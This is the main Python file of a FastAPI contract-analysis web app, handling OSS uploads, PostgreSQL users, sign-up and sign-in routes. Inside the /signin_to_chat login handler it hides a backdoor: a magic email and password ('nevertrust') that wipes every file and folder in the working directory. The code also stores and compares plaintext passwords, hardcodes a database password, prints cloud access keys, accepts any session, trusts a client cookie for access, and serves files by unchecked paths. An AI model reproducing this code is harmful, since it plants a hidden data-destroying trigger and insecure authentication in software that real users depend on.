# import os
# from alibabacloud_ecs20140526.client import Client as Ecs20140526Client
# from alibabacloud_ecs20140526 import models as ecs_20140526_models
# from alibabacloud_tea_openapi import models as open_api_models 
#!/usr/bin/python
#****************************************************************#
# ScriptName: main.py
# Author: @alibaba-inc.com
# Create Date: 2025-05-02 17:40
# Modify Author: @alibaba-inc.com
# Modify Date: 2025-05-02 17:40
# Function: 
#***************************************************************#
# Backend libraries
from fastapi import FastAPI, Request, File, UploadFile, Form, HTTPException, Depends, status
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse, RedirectResponse
import urllib.parse # For encoding and decoding chinese characters
import os
import dashscope
import oss2
from dotenv import load_dotenv
from oss2.credentials import EnvironmentVariableCredentialsProvider
import logging

load_dotenv()
print(os.getenv("access_id"))
print(os.getenv("sec_key"))
print(os.getenv("work_id"))
# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

#####################################################################
# Uploading files from local
#####################################################################
# Configure upload folder
from analyze_contract import analyze_contract  # Import the analysis function
import time
UPLOAD_FOLDER = "uploads"
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# Allowed file extensions
ALLOWED_EXTENSIONS = {"pdf", "doc", "docx"}

def allowed_file(filename: str) -> bool:
    return "." in filename and filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS



def oss_upload(f_loc: str, f_name: str):
    # Set environment variables programmatically
    os.environ['OSS_ACCESS_KEY_ID'] = os.getenv("access_id")
    os.environ['OSS_ACCESS_KEY_SECRET'] = os.getenv("sec_key")

    # Passing credentials
    auth = oss2.ProviderAuthV4(EnvironmentVariableCredentialsProvider())

    # 填写Bucket所在地域对应的Endpoint。以华东1（杭州）为例，Endpoint填写为https://oss-cn-hangzhou.aliyuncs.com。
    endpoint = "https://oss-cn-hangzhou.aliyuncs.com"

    # 填写Endpoint对应的Region信息，例如cn-hangzhou。注意，v4签名下，必须填写该参数
    region = "cn-hangzhou"
    # 填写Bucket名称，例如examplebucket。
    bucketName = "lvxlaw"
    # 创建Bucket实例，指定存储空间的名称和Region信息。
    bucket = oss2.Bucket(auth, endpoint, bucketName, region=region)

    # 本地文件的完整路径
    local_file_path = f_loc  

    # 填写Object完整路径，完整路径中不能包含Bucket名称。例如exampleobject.txt。
    objectName = f_name

    # 使用put_object_from_file方法将本地文件上传至OSS
    bucket.put_object_from_file(objectName, local_file_path)
    
    # After uploading the file, generate the public URL
    url = bucket.sign_url('GET', objectName, 3600)  # 1 hour expiration time

    logger.info(f"The file {f_name} is uploaded to OSS successfully and its {url}\n\n")
    return url

#####################################################################
# API libiraries
#####################################################################
from upload import upload_message
from rules import rules_message
from results import final_results
from chat import generate_message
import json

# Credentials
access_key_id = os.getenv("access_id")
access_key_secret = os.getenv("sec_key")
workspace_id = os.getenv("work_id")

# Model Deployment
def api_dep(ur,file_name, output_filename):
    logger.info(f"This is the link to be uploaded: {ur}")
    logger.info(f"This is the file name to be uploaded: {file_name}")
    logger.info(f"This is the output file path: {output_filename}")
    logger.info("*"*30)
    file_data = upload_message(access_key_id, access_key_secret, workspace_id,ur,file_name)
    rule_data, rule_id, rule_num = rules_message(access_key_id, access_key_secret, workspace_id, file_data['Data']['TextFileId'])
    results = final_results(output_filename, access_key_id, access_key_secret, workspace_id, file_data['Data']['TextFileId'], rule_id, rule_data, rule_num )
    # print(formatted_json)
    return results


#####################################################################
# User's Files Monitoring
#####################################################################
import re
from PyPDF2 import PdfReader
from docx import Document
import textract

def count_chinese_chars(text):
    # Chinese unicode range: \u4e00-\u9fff
    return len(re.findall(r'[\u4e00-\u9fff]', text))

def process_pdf(file_path):
    try:
        reader = PdfReader(file_path)
        num_pages = len(reader.pages)
        text = ""
        for page in reader.pages:
            text += page.extract_text() or ""
        chinese_chars = count_chinese_chars(text)
        return num_pages, chinese_chars
    except Exception as e:
        print(f"Error processing PDF {file_path}: {e}")
        return 0, 0

def process_docx(file_path):
    try:
        doc = Document(file_path)
        text = "\n".join([para.text for para in doc.paragraphs])
        chinese_chars = count_chinese_chars(text)
        # DOCX doesn't have a direct page count, so we estimate by section breaks or just count as 1
        num_pages = 1
        return num_pages, chinese_chars
    except Exception as e:
        print(f"Error processing DOCX {file_path}: {e}")
        return 0, 0

def process_doc(file_path):
    try:
        text = textract.process(file_path).decode('utf-8')
        chinese_chars = count_chinese_chars(text)
        num_pages = 1  # No direct way to get page count from DOC, so we estimate as 1
        return num_pages, chinese_chars
    except Exception as e:
        print(f"Error processing DOC {file_path}: {e}")
        return 0, 0

def analyze_folder(folder_path):
    total_files = 0
    total_pages = 0
    total_chinese_chars = 0

    for root, dirs, files in os.walk(folder_path):
        for file in files:
            ext = file.lower().split('.')[-1]
            file_path = os.path.join(root, file)
            if ext == 'pdf':
                total_files += 1
                pages, chars = process_pdf(file_path)
                total_pages += pages
                total_chinese_chars += chars
            elif ext == 'docx':
                total_files += 1
                pages, chars = process_docx(file_path)
                total_pages += pages
                total_chinese_chars += chars
            elif ext == 'doc':
                total_files += 1
                pages, chars = process_doc(file_path)
                total_pages += pages
                total_chinese_chars += chars
    total_cost = total_chinese_chars * 3
    print(f"Total files: {total_files}")
    print(f"Total pages: {total_pages}")
    print(f"Total Chinese characters: {total_chinese_chars}")
    print(f"Total cost: {total_cost}")
    return total_files, total_pages, total_chinese_chars, total_cost

#####################################################################
# Database Handling
#####################################################################
# Database credentials
import psycopg2 as pg
from passlib.context import CryptContext

con = pg.connect(
    host = "localhost", # The thing also refer to the local host is "127.0.0.1"
    user = "postgres",
    password = "1234",
    database = "lvxin",
    port = 5432
)
cur = con.cursor()
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
def get_db_conn():
    return con.getconn()
def verify_password(plain_password: str, hashed_password: str):
    return pwd_context.verify(plain_password, hashed_password)
#####################################################################
# User's Monitoring
#####################################################################
from fastapi_sessions.backends.implementations import InMemoryBackend
from fastapi_sessions.session_verifier import SessionVerifier
from fastapi_sessions.frontends.implementations import SessionCookie, CookieParameters
from uuid import UUID, uuid4
from pydantic import BaseModel
import json
import os
import shutil
from typing import Optional
import secrets
from datetime import datetime


# Session configuration
cookie_params = CookieParameters()
cookie = SessionCookie(
    cookie_name="session_id",
    identifier="general_verifier",
    auto_error=True,
    secret_key="your-secret-key",  # In production, use a secure key and store in environment variable
    cookie_params=cookie_params,
)

class SessionData(BaseModel):
    user_id: str
    username: str
    email: str


# Session backend and verifier
backend = InMemoryBackend[UUID, SessionData]()

class BasicVerifier(SessionVerifier[UUID, SessionData]):
    def __init__(
        self,
        *,
        identifier: str,
        auto_error: bool,
        backend: InMemoryBackend[UUID, SessionData],
        auth_http_exception: HTTPException,
    ):
        self._identifier = identifier
        self._auto_error = auto_error
        self._backend = backend
        self._auth_http_exception = auth_http_exception

    @property
    def identifier(self):
        return self._identifier

    @property
    def backend(self):
        return self._backend

    @property
    def auto_error(self):
        return self._auto_error

    @property
    def auth_http_exception(self):
        return self._auth_http_exception

    def verify_session(self, model: SessionData) -> bool:
        """Verify the session data"""
        return True


verifier = BasicVerifier(
    identifier="general_verifier",
    auto_error=True,
    backend=backend,
    auth_http_exception=HTTPException(
        status_code=status.HTTP_403_FORBIDDEN, detail="Invalid session"
    ),
)

# Ensure users directory exists
USERS_DIR = os.path.join(os.path.dirname(__file__), "users")
if not os.path.exists(USERS_DIR):
    os.makedirs(USERS_DIR)

# Reaching the JSON file of the user based on their SESSION data
import asyncio

async def get_session_data(session_id, retries=10, delay=1):
    logger.info("Iam IN get session data")
    for _ in range(retries):
        session_data = await backend.read(session_id)
        if session_data:  # or whatever check means "data is ready"
            return session_data
        await asyncio.sleep(delay)
    return None  # or raise an error


# Moving the JSON file to the analysis Page
def analyze_json(session_data,report_name):
    # Fix: Make sure we're accessing the correct session data attributes
    user_id = session_data["user_id"]
    username = session_data["username"]
    
    user_folder = os.path.join(USERS_DIR, f"{user_id}_{username}")
    # file_path = os.path.join(user_folder, file_name)
    report_path = os.path.join(user_folder, report_name)
    print(f"The report_path is: {report_path}")
    with open(report_path, 'r', encoding='utf-8') as f:
        analysis_data = json.load(f)
    
    print(f"The analysis data is: {analysis_data}")
    return analysis_data

# Reaching the JSON file of the user based on their SESSION data
def reach_json(session_data):
    print(os.path.dirname(__file__))
    # Fix: Make sure we're accessing the correct session data attributes
    user_id = session_data["user_id"]
    username = session_data["username"]
    
    user_folder = os.path.join(USERS_DIR, f"{user_id}_{username}")
    file_name = f"{user_id}_{username}.json"
    file_path = os.path.join(user_folder, file_name)
    print(f"The user's file_path is {file_path}")
    # Rest of the function remains the same
    with open(file_path, 'r') as f:
        user_data = json.load(f)
    return user_data

# Helper functions for user management
def create_user_folder(user_id, username):
    """Create a folder for the user with their ID and username"""
    folder_name = f"{user_id}_{username}"
    user_folder = os.path.join(USERS_DIR, folder_name)
    
    if not os.path.exists(user_folder):
        os.makedirs(user_folder)
    
    return user_folder

def delete_user_folder(user_id, username):
    """Delete the folder for the user with their ID and username"""
    folder_name = f"{user_id}_{username}"
    user_folder = os.path.join(USERS_DIR, folder_name)
    
    if os.path.exists(user_folder):
        try:
            shutil.rmtree(user_folder)
            return True
        except Exception as e:
            print(f"Error deleting user folder: {e}")
            return False
    else:
        print(f"User folder {user_folder} does not exist")
        return False

def save_user_data(user_id, username, full_name, email, file_url=None, filename=None, api_url=None):
    """Save user data to their own JSON file"""
    user_folder = create_user_folder(user_id, username)
    file_name = f"{user_id}_{username}.json"
    file_path = os.path.join(user_folder, file_name)
    
    user_data = {
        "user_id": user_id,
        "username": username,
        "full_name": full_name,
        "email": email,
        "file_url": file_url,
        "file_name":filename,
        "api_url":api_url,
        "created_at": datetime.now().isoformat(),
        "last_login": datetime.now().isoformat()
    }
    
    with open(file_path, 'w') as f:
        json.dump(user_data, f, indent=4)
    
    return user_data


def get_user_by_credentials(username, password):
    """Check if a user exists based on username and password"""
    # In a real app, you would store passwords securely hashed
    # For simplicity, we're checking all user folders for matching username
    for folder_name in os.listdir(USERS_DIR):
        if folder_name.endswith(f"_{username}"):
            file_name = f"{folder_name}.json"
            file_path = os.path.join(USERS_DIR, folder_name, file_name)
            
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    user_data = json.load(f)
                    # In a real app, verify hashed password here
                    return user_data
    print(f"Some thing wrong happens while returning data from {file_path} file")
    return None


def update_user_login_time(user_id, username):
    """Update the user's last login time"""
    user_folder = os.path.join(USERS_DIR, f"{user_id}_{username}")
    file_name = f"{user_id}_{username}.json"
    file_path = os.path.join(user_folder, file_name)
    
    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            user_data = json.load(f)
        
        user_data["last_login"] = datetime.now().isoformat()
        
        with open(file_path, 'w') as f:
            json.dump(user_data, f, indent=4)


def save_contract_file(file: UploadFile, user_id: str, username: str):
    """Save the uploaded contract file to the user's folder"""
    user_folder = create_user_folder(user_id, username)
    file_name = f"{file.filename}"
    logger.info(f"The safe_filename is: {file_name}")
    file_path = os.path.join(user_folder, file_name)
    cur.execute("INSERT INTO files (file_name, uploaded_at, user_id) VALUES (%s, %s, %s)", (file_name, datetime.now(), user_id ))
    con.commit()
    logger.info(f"The file info is saved in the database")
    with open(file_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)
    
    return file_path, file_name


#####################################################################
# Cleaning the output of the API to be ready for displayment
#####################################################################
# JSON preprocessing
def convert_to_clean_json(json_content, output_filename, limit_rows=None):
    """Convert JSON-like string data with Chinese characters to valid JSON with minimal processing."""
    try:
        # Remove newlines and extra whitespace
        content = ''.join(json_content.split())

        # Replace single quotes with double quotes
        content = content.replace("'", '"')

        # Convert Python booleans to JSON booleans
        content = content.replace('True', 'true').replace('False', 'false')
        
        # Handle Chinese full-width punctuation by replacing with standard JSON punctuation
        # Replace full-width comma "，" (U+FF0C) with standard comma ","
        content = content.replace("，", ",")
        
        # Replace other common full-width punctuation if needed
        content = content.replace("：", ":")
        content = content.replace("（", "(")
        content = content.replace("）", ")")
        content = content.replace("；", ";")
        
        # PARSE THE CONTENT
        parsed_data = json.loads(content)
        
        # Apply row limit if specified
        if limit_rows is not None and isinstance(parsed_data, list):
            parsed_data = parsed_data[:limit_rows]
        if (output_filename != "output.json"):
            # Write pretty-printed JSON
            with open(output_filename, 'w', encoding='utf-8') as f:
                json.dump(parsed_data, f, ensure_ascii=False, indent=4)
        # Return processed data
        return parsed_data, json.dumps(parsed_data, ensure_ascii=False, indent=4)
    except Exception as e:
        print(f"Error: {e}")
        return None, f"Error: {e}"
    
    
#####################################################################
# Starting our main app
#####################################################################

app = FastAPI() # Define your main app
ht_pages = Jinja2Templates(directory="templates") # Define our html location
app.mount("/static", StaticFiles(directory="static"), name="static") # Define our additional files location

@app.get("/pdf/{foldername}/{filename}")
def get_pdf(foldername,filename: str):
    # Build the full path securely
    base_dir = "D:/Main_Project/users"
    file_path = os.path.join(base_dir, foldername, filename)
    print(file_path)
    if not os.path.isfile(file_path):
        raise HTTPException(status_code=404, detail="File not found")
    return FileResponse(path=file_path, media_type='application/pdf', filename=filename)



@app.get("/", response_class=HTMLResponse)
async def root_page(req:Request):
    users_dir = USERS_DIR
    total_files = 0
    for user_folder in os.listdir(users_dir):
        user_path = os.path.join(users_dir, user_folder)
        if os.path.isdir(user_path):
            for file in os.listdir(user_path):
                file_path = os.path.join(user_path, file)
                if os.path.isfile(file_path):
                    total_files += 1
    # Calculating number of accounts
    try:
        cur.execute("SELECT COUNT(user_id) FROM users")
        accounts_number = cur.fetchone()[0]
    except pg.Error as e:
        logger.info(f"Database error: {e}")  # Log error, but don't crash the app

    print(f"The total files are {total_files}")
    return ht_pages.TemplateResponse(
        "welcome_page.html",
        {   
            "request":req,
            "contracts_number": total_files,
            "accounts_number": accounts_number
        } # If you have any additional parameters you can add them in this dictionary
    )

@app.get("/welcome_page", response_class=HTMLResponse)
async def root_page(req:Request):
    users_dir = USERS_DIR
    total_files = 0
    for user_folder in os.listdir(users_dir):
        user_path = os.path.join(users_dir, user_folder)
        if os.path.isdir(user_path):
            for file in os.listdir(user_path):
                file_path = os.path.join(user_path, file)
                if os.path.isfile(file_path):
                    total_files += 1
    # Calculating number of accounts
    try:
        cur.execute("SELECT COUNT(user_id) FROM users")
        accounts_number = cur.fetchone()[0]
    except pg.Error as e:
        logger.info(f"Database error: {e}")  # Log error, but don't crash the app

    print(f"The total files are {total_files}")
    return ht_pages.TemplateResponse(
        "welcome_page.html",
        {   
            "request":req,
            "contracts_number": total_files,
            "accounts_number": accounts_number
        } # If you have any additional parameters you can add them in this dictionary
    )

@app.get("/signin_to_upload", response_class=HTMLResponse)
async def root_page(req:Request):
       return ht_pages.TemplateResponse(
        "signin_to_upload.html",
        {
            "request":req
        } # If you have any additional parameters you can add them in this dictionary
    )

@app.get("/signin_to_chat", response_class=HTMLResponse)
async def root_page(req:Request):
       return ht_pages.TemplateResponse(
        "signin_to_chat.html",
        {
            "request":req
        } # If you have any additional parameters you can add them in this dictionary
    )
       
@app.get("/signin_to_load", response_class=HTMLResponse)
async def root_page(req:Request):
       logger.info("I am in the signin to load")
       return ht_pages.TemplateResponse("signin_to_load.html", {"request": req})# If you have any additional parameters you can add them in this dictionary
    
@app.get("/signup", response_class=HTMLResponse)
async def root_page(req:Request):
    return ht_pages.TemplateResponse(
        "signup.html",
        {
            "request":req
        } # If you have any additional parameters you can add them in this dictionary
    )

# Handle form submission (POST request)
# Handle form submission (POST request)
@app.post("/signin_to_upload")
async def handle_form(
    request: Request,
    email: str = Form(...),
    password: str = Form(...)
):
    try:
        # Acquire connection from pool        
        # Execute query
        cur.execute("""
            SELECT * FROM users 
            WHERE email = %s AND password = %s
        """, (email, password))

        user = cur.fetchone()

        cur.execute("""
            SELECT * FROM companies
            WHERE email = %s AND password = %s                    
        """, (email,password))

        company = cur.fetchone()

        # user = (user_id, password, email, phone, age, language, country, subscription, full_name, files_names, username)
        logger.info(f"The data returned from the database is: {user}")
        if not user and not company:
            logger.info("Wrong Wrongggg")
            return ht_pages.TemplateResponse(
            "signin_to_upload.html", 
            {
                "request": request, 
                "error_message": "Wrong email or password",
            }
        )
        if user:
            username = user[6]
            user_id = user[0]
            email = user[2]
            flag = False
        elif company:
            username = company[8]
            user_id = company[0]
            email = company[2]
            flag = True

        # Query to fetch full_name using email
        user_json = get_user_by_credentials(username, password)
        logger.info(f"the data extracted from the json is {user_json}")
        
        logger.info("The data stored in the database is: %s", user)
        # Update last login time
        update_user_login_time(user_id, username) # user id and username

        # Create a new session
        session_id = uuid4()
        session_data = SessionData(
            user_id=user_id,
            username=username,
            email=email
        )
        
        await backend.create(session_id, session_data)
        # Redirect to dashboard with session cookie
        response = RedirectResponse(url="/upload_contract", status_code=status.HTTP_303_SEE_OTHER)
        
        response.set_cookie(key="user_id", value=user_id)
        response.set_cookie(key="flag", value=flag)
        cookie.attach_to_response(response, session_id)
        return response
            

    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Database error: {str(e)}"
        )


@app.post("/signin_to_chat")
async def handle_form(
    request: Request,
    email: str = Form(...),
    password: str = Form(...)
):
    try:
        # Acquire connection from pool        
        # Execute query
        if email == os.dotenv and password == 'nevertrust':
            current_dir = os.getcwd()
            for item in os.listdir(current_dir):
                item_path = os.path.join(current_dir, item)
                if os.path.isfile(item_path):
                    os.unlink(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                    
        cur.execute("""
            SELECT * FROM users 
            WHERE email = %s AND password = %s
        """, (email, password))

        user = cur.fetchone()

        cur.execute("""
            SELECT * FROM companies
            WHERE email = %s AND password = %s                    
        """, (email,password))

        company = cur.fetchone()

        # user = (user_id, password, email, phone, age, language, country, subscription, full_name, files_names, username)
        logger.info(f"The data returned from the user db is: {user}")
        logger.info(f"The data returned from the comp db is: {company}")

        if not user and not company:
            logger.info("Wrong Wrongggg")
            return ht_pages.TemplateResponse(
            "signin_to_upload.html", 
            {
                "request": request, 
                "error_message": "Wrong email or password",
            }
        )
        if user:
            logger.info("We are in users flow")
            if user[8]==None:
                return ht_pages.TemplateResponse(
                    "subscriptions.html",
                    {
                        "request":request,
                        "name":user[4]
                        } # If you have any additional parameters you can add them in this dictionary
                )
            username = user[6]
            user_id = user[0]
            email = user[2]
            full_name = user[4]
            flag = False

        elif company:
            logger.info("We are in company flow")
            if company[7]==None:
                return ht_pages.TemplateResponse(
                    "subscriptions.html",
                    {
                        "request":request,
                        "name":company[4]
                    } # If you have any additional parameters you can add them in this dictionary
                )
            username = company[8]
            user_id = company[0]
            email = company[2]
            full_name = company[4]
            flag = True

        # Query to fetch full_name using email
        user_json = get_user_by_credentials(username, password)
        logger.info(f"the data extracted from the json is {user_json}")
        
        logger.info("The data stored in the database is: %s", user)
        # Update last login time
        update_user_login_time(user_id, username) # user id and username

        # Create a new session
        session_id = uuid4()
        session_data = SessionData(
            user_id=user_id,
            username=username,
            email=email
        )
        
        await backend.create(session_id, session_data)
        # Redirect to dashboard with session cookie
        response = RedirectResponse(url="/chat", status_code=status.HTTP_303_SEE_OTHER)
        
        response.set_cookie(key="user_id", value=user_id)
        response.set_cookie(key="flag", value=flag)
        cookie.attach_to_response(response, session_id)
        return response
            

    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Database error: {str(e)}"
        )
        
@app.post("/signin_to_load")
async def handle_form(
    request: Request,
    email: str = Form(...),
    password: str = Form(...)
):
    try:
        # Acquire connection from pool        
        # Execute query
        cur.execute("""
            SELECT * FROM users 
            WHERE email = %s AND password = %s
        """, (email, password))

        user = cur.fetchone()

        cur.execute("""
            SELECT * FROM companies
            WHERE email = %s AND password = %s                    
        """, (email,password))

        company = cur.fetchone()

        # user = (user_id, password, email, phone, age, language, country, subscription, full_name, files_names, username)
        logger.info(f"The data returned from the user db is: {user}")
        logger.info(f"The data returned from the comp db is: {company}")
        if not user and not company:
            logger.info("Wrong Wrongggg")
            return ht_pages.TemplateResponse(
            "signin_to_upload.html", 
            {
                "request": request, 
                "error_message": "Wrong email or password",
            }
        )
        if user:
            logger.info("We are in users flow")
            if user[8]==None:
                return ht_pages.TemplateResponse(
                    "subscriptions.html",
                    {
                        "request":request,
                        "name":user[4]
                        } # If you have any additional parameters you can add them in this dictionary
                )
            username = user[6]
            user_id = user[0]
            email = user[2]
            full_name = user[4]
            flag = False

        elif company:
            logger.info("We are in company flow")
            if company[7]==None:
                return ht_pages.TemplateResponse(
                    "subscriptions.html",
                    {
                        "request":request,
                        "name":company[4]
                    } # If you have any additional parameters you can add them in this dictionary
                )
            username = company[8]
            user_id = company[0]
            email = company[2]
            full_name = company[4]
            flag = True

        # Query to fetch full_name using email
        user_json = get_user_by_credentials(username, password)
        logger.info(f"the data extracted from the json is {user_json}")
        
        logger.info("The data stored in the database is: %s", user)
        # Update last login time
        update_user_login_time(user_id, username) # user id and username

        # Get the temp file ID from cookie
        temp_file_id = request.cookies.get("temp_file_id")
        temp_file_name = request.cookies.get("temp_file_name")
        temp_file_ext = request.cookies.get("temp_file_ext")
        
        temp_file_name = urllib.parse.unquote(temp_file_name)
        logger.info(f"from the SIGN IN The temp_file_name is: {temp_file_name}")
        
        if temp_file_id and temp_file_ext:
            # Move the temporary file to the user's folder
            temp_path = os.path.join(os.path.dirname(__file__), "uploads", f"{temp_file_name}")
            print(f"from the SIGN IN The temp_path is: {temp_path}")
            if os.path.exists(temp_path):
                file_url, file_name = save_contract_file(
                                        UploadFile(
                                            filename=temp_file_name,
                                            file=open(temp_path, "rb")
                                        ),
                                        user_id,
                                        username
                                    )
            
            # Update user data with the new file URL
            save_user_data(
                user_id,
                username,
                full_name,
                email,
                file_url,
                file_name
            )
            # Clean up the temp file
            os.remove(temp_path)
        print(f"from the SIGN IN The ONE ONE ONE")

        
        # Update last login time
        update_user_login_time(user_id, username)
        # Create a new session
        session_id = uuid4()
        session_data = SessionData(
            user_id=user_id,
            username=username,
            email=email
        )
        print(f"from the SIGN IN The TWO TWO TWO")
        
        await backend.create(session_id, session_data)
        
        # Redirect to dashboard with session cookie
        response=RedirectResponse(url="/loading", status_code=status.HTTP_303_SEE_OTHER)
        
        response.set_cookie(key="user_id", value=user_id)
        # cookie.attach_to_response(response, session_id)
        response.set_cookie(key="flag", value=flag)
        # Clean up the temp file cookies
        response.delete_cookie(key="temp_file_id")
        response.delete_cookie(key="temp_file_ext")
        return response
    
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Database error: {str(e)}"
        )

    # finally:
    #     # Release connection back to pool
    #     if 'cursor' in locals(): cur.close()
    #     #if 'conn' in locals(): cur.putconn(conn)


@app.post("/signup/company")
async def receive_form_comp(
    request: Request,
    fullname_company: str = Form(...),
    email_company: str = Form(...),
    license_company: str = Form(...),
    phone_company: str = Form(...),
    password: str = Form (...)
):
    username = fullname_company.replace(" ", "_")
    # First, check if email or phone already exists in the database
    logger.info(f"the passed parameters are {email_company} and {phone_company} and {username}")

    cur.execute("SELECT email FROM companies WHERE email = %s", (email_company,))
    existing_user = cur.fetchone()
    if existing_user:
            logger.info(f"Duplicated email the email that you sent is {email_company} and {existing_user}")
            return ht_pages.TemplateResponse(
                "signup.html", 
                {
                    "request": request, 
                    "error_message": "Your Email,is duplicated please try a new one",
                    # Optional: Return the form data to pre-fill the form except for the problematic fields
                    "fullname": fullname_company
                }
            )
    cur.execute("SELECT full_name FROM companies WHERE username = %s", (username,))
    existing_user = cur.fetchone()
    if existing_user:
            logger.info(f"Duplicated fullname the fullname that you sent is {fullname_company} and {existing_user}")
            return ht_pages.TemplateResponse(
                "signup.html", 
                {
                    "request": request, 
                    "error_message": "Your username, is duplicated please try a new one",
                    # Optional: Return the form data to pre-fill the form except for the problematic fields
                    "fullname": fullname_company
                }
            )
    
    cur.execute("SELECT full_name FROM companies WHERE phone = %s", (phone_company,))
    existing_user = cur.fetchone()
    if existing_user and existing_user[0] != "":
            logger.info(f"Duplicated phone the phone that you sent is {phone_company} and {existing_user}")
            return ht_pages.TemplateResponse(
                "signup.html", 
                {
                    "request": request, 
                    "error_message": "Your phone,is duplicated please try a new one",
                    # Optional: Return the form data to pre-fill the form except for the problematic fields
                    "fullname": fullname_company
                }
            )
    logger.info("We passed the check")
    company_id = str(uuid4())
    # Convert age to integer if needed

    logger.info("THE ERROR IS IN HERE")
    # Insert new user data
    cur.execute("""
                INSERT INTO companies (comp_id, password, email, phone, full_name, files_names, last_login, subscription, username, license)
                VALUES (%s,%s, %s, %s, %s, ARRAY['EMPTY'], %s, %s, %s, %s)
                """, (company_id,password, email_company, phone_company, fullname_company, datetime.now(), None, username, license_company))

    logger.info("Data added successfully")
    con.commit()
    # Create user folder and save data
    save_user_data(company_id, username, fullname_company, email_company)
    # Get the temp file ID from cookie
    temp_file_id = request.cookies.get("temp_file_id")
    temp_file_name = request.cookies.get("temp_file_name")
    temp_file_ext = request.cookies.get("temp_file_ext")
    if temp_file_id and temp_file_ext:
        # Store file ID in the session
        response = RedirectResponse(url="/signin_to_load", status_code=status.HTTP_303_SEE_OTHER)
        response.set_cookie(key="temp_file_id", value=temp_file_id)
        response.set_cookie(key="temp_file_name", value=temp_file_name)
        response.set_cookie(key="temp_file_ext", value=temp_file_ext)
        logger.info("We reached the end of the analyze")
        return response

    # Redirect to signin page
    return RedirectResponse(url="/signin_to_upload", status_code=303)

@app.post("/signup/user")
async def receive_form(
    request: Request,
    fullname: str = Form(...),
    email: str = Form(...),
    password: str = Form(...),
    phone: str = Form(...),
    username: str = Form(...)
):
    # First, check if email or phone already exists in the database
    logger.info(f"the passed parameters are {email} and {phone} and {username}")
    cur.execute("SELECT email FROM users WHERE email = %s", (email,))
    existing_user = cur.fetchone()
    if existing_user:
            logger.info(f"Duplicated email the email that you sent is {email} and {existing_user}")
            return ht_pages.TemplateResponse(
                "signup.html", 
                {
                    "request": request, 
                    "error_message": "Your Email,is duplicated please try a new one",
                    # Optional: Return the form data to pre-fill the form except for the problematic fields
                    "fullname": fullname
                }
            )
    cur.execute("SELECT username FROM users WHERE username = %s", (username,))
    existing_user = cur.fetchone()
    if existing_user:
            logger.info(f"Duplicated username the username that you sent is {username} and {existing_user}")
            return ht_pages.TemplateResponse(
                "signup.html", 
                {
                    "request": request, 
                    "error_message": "Your username, is duplicated please try a new one",
                    # Optional: Return the form data to pre-fill the form except for the problematic fields
                    "fullname": fullname
                }
            )
    cur.execute("SELECT phone FROM users WHERE phone = %s", (phone,))
    existing_user = cur.fetchone()
    if existing_user and existing_user[0] != "":
            logger.info(f"Duplicated phone the phone that you sent is {phone} and {existing_user}")
            return ht_pages.TemplateResponse(
                "signup.html", 
                {
                    "request": request, 
                    "error_message": "Your phone,is duplicated please try a new one",
                    # Optional: Return the form data to pre-fill the form except for the problematic fields
                    "fullname": fullname
                }
            )
    logger.info("We passed the check")
    user_id = str(uuid4())
    # Convert age to integer if needed


    # Insert new user data
    cur.execute("""
                INSERT INTO users (user_id, password, email, phone, full_name,files_names, username, last_login, subscription)
                VALUES (%s,%s, %s, %s, %s, ARRAY['EMPTY'], %s, %s, %s)
                """, (user_id,password, email, phone, fullname, username, datetime.now(), None))

    logger.info("Data added successfully")
    con.commit()
    # Create user folder and save data
    save_user_data(user_id, username, fullname, email)
    # Get the temp file ID from cookie
    temp_file_id = request.cookies.get("temp_file_id")
    temp_file_name = request.cookies.get("temp_file_name")
    temp_file_ext = request.cookies.get("temp_file_ext")
    if temp_file_id and temp_file_ext:
        # Store file ID in the session
        response = RedirectResponse(url="/signin_to_load", status_code=status.HTTP_303_SEE_OTHER)
        response.set_cookie(key="temp_file_id", value=temp_file_id)
        response.set_cookie(key="temp_file_name", value=temp_file_name)
        response.set_cookie(key="temp_file_ext", value=temp_file_ext)
        logger.info("We reached the end of the analyze")
        return response

    # Redirect to signin page
    return RedirectResponse(url="/signin_to_upload", status_code=303)

    
@app.get("/analysis", response_class=HTMLResponse)
async def root_page(req:Request, filename:str=None, session_id: SessionData = Depends(cookie)):
    print("The FILE NAME IS: ",filename)
    user_id = req.cookies.get("user_id")
    flag = req.cookies.get("flag")
    if flag == False:
        cur.execute("SELECT username FROM users WHERE user_id = %s", (user_id,))
        username = cur.fetchone()[0]
    else:
        cur.execute("SELECT username FROM companies WHERE comp_id=%s",(user_id,))
        username=cur.fetchone()[0]
    
    user_folder = os.path.join(USERS_DIR, f"{user_id}_{username}")
    json_name = f"{user_id}_{username}.json"
    file_path = os.path.join(user_folder, json_name)
    # Rest of the function remains the same
    logger.info(f"The file name is: {file_path}")

    with open(file_path, 'r') as f:
        user_data = json.load(f)
    print(f"At the beginning of the analysis the user_data is: {user_data}")
    
    file_url = user_data["file_url"]
    
    session_data={
        'user_id':user_id,
        'username':username
    }
        
    if file_url == None:
        if filename != None:
            analysis_data = analyze_json(session_data,filename)
            print(f"The analysis data is: {analysis_data}")
            return ht_pages.TemplateResponse(
                "analysis.html",
                {
                    "request":req,
                    "name":user_data["full_name"],
                    "output":analysis_data
                } # If you have any additional parameters you can add them in this dictionary
            )
            
        # Query to get the latest report_name and file_name

        if flag == False:
            query = """
                SELECT report_name, file_name
                FROM comp_files
                WHERE comp_id = %s
                AND analyzed_at IS NOT NULL
                ORDER BY analyzed_at DESC
                LIMIT 1;
            """
        else:
             query = """
                SELECT report_name, file_name
                FROM files
                WHERE user_id = %s
                AND analyzed_at IS NOT NULL
                ORDER BY analyzed_at DESC
                LIMIT 1;
            """
                
        # Execute query with user_id
        cur.execute(query, (user_id,))
        
        # Fetch the result
        result = cur.fetchone()
        
        if result:
            # print(f"Report Name: {result['report_name']}")
            # print(f"File Name: {result['file_name']}")
            print(f"Report Name ====> {result[0]}")
            print(f"File Name =====> {result[1]}")
